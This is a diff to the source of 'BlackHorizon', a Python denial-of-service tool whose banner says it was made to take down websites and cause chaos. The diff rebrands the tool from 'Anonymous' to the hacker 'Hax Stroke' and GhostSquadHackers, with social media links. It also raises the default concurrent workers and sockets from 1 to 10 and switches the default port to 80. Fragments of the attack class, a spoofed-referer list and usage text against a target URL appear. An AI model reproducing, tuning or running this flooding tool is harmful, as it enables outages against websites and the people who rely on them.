@@ -23,11 +23,11 @@
 #IIIIilIIIIITTTTTTTIIIIIIIIIIIIITTTTTIIIIIIIIITTTTTTTTTTIIIIIIIIIlIIIIIIIITTTT#
 #IIIIIIIIITTTTTTTTTTTTTIIIIIIIITTTTTTTTIIIIIITTTTTTTTTTTTTTIIIIIIIIIIIIIITTTTT#
 #Black Horizon iDDoS Tool Created for takedown some websites and give chaos   #
-#################################Anonymous#####################################
-###############################WE ARE HERE#####################################
-###############################################################################
-###################################ANON########################################
-#########################THE WORLD WIDE WEB ATTACK###########++++##############
+################################M1R0X##########################################
+########################youtube.com/c/MIR0X####################################
+###########################Twitter: @M1r0x_####################################
+###################################GSH#########################################
+##################https://www.facebook.com/GhostSquadHackers/##################
 
 
 from multiprocessing import Process, Manager, Pool
@@ -58,10 +58,10 @@ METHOD_RAND = 'random'
 
 JOIN_TIMEOUT=1.0
 
-DEFAULT_CLOUNDS=1
-DEFAULT_SOCKETS=1
+DEFAULT_CLOUNDS=10
+DEFAULT_SOCKETS=10
 
-BLACKHORIZON_BANNER = 'BlackHorizon Clound Based DDoS Tool Created ANONYMOUS MEMBERS'
+BLACKHORIZON_BANNER = 'BlackHorizon Clound Based DDoS Tool Created By Hax Stroke for GSH Members'
 
 USER_AGENT_PARTS = {
     'os': {
@@ -111,10 +111,10 @@ class BlackHorizon(object):
 
     # Containers
     cloundsQueue = []                                                  ###############################
-    manager = None                                                     #~~~~Created By Anonymous~~~~~#
+    manager = None                                                     #~~~~Created By Hax Stroke~~~~#
     useragents = []                                                    #~~~~~~~~~~@FollowMe~~~~~~~~~~#
-                                                                       #~~~~~~WATCH THIS BITCH~~~~~~~#
-    # Properties                                                       #~~~~~~~~HA HA HA HA ~~~~~~~~~#
+                                                                       #~~~youtube.com/c/HaXStroKE~~~#
+    # Properties                                                       #~~~~~Twitter:@HaxStroKE~~~~~~#
     url = None                                                         ###############################
 
     # Options
@@ -232,7 +232,7 @@ class Striker(Process):
     # Containers
     url = None
     host = None
-    port = 443
+    port = 80
     ssl = False
     referers = []
     useragents = []
@@ -274,8 +274,8 @@ class Striker(Process):
             'http://www.yandex.com/',                                             #Botnets                   #
             'http://www.yahoo.com/',                                              #Infected's Websites       #
             'http://www.globo.com/',                                              #Best's Shells Only        #
-            'http://www.pastebin.com/',                                           #__________________________#
-            'https://www.nasa.gov/',                                              #From Anonymous Hackers    #
+            'http://www.pastebin.com/',                                           #All uploaded by Hax Stroke#
+            'https://www.nasa.gov/',                                              #From GhostSquadHackers    #
             'https://www.facebook.com/',                                          ############################
             'http://www.chris.com/',
             'http://www.retrojunkie.com/',
@@ -547,7 +547,7 @@ def usage():
     print ' USAGE: ./BlackHorizon.py http://www.target.com/ [OPTIONS]'
     print ' -c, --clounds Number of concurrent clounds\t(default: {0})'.format(DEFAULT_CLOUNDS)
     print ' -s, --sockets Number of concurrent sockets\t(default: {0})'.format(DEFAULT_SOCKETS)
-    print 'FUCK YOU '
+    print 'GhostSquadHackers page: https://www.facebook.com/GhostSquadHackers/'
     print "\a"
 print \
 """                                                       
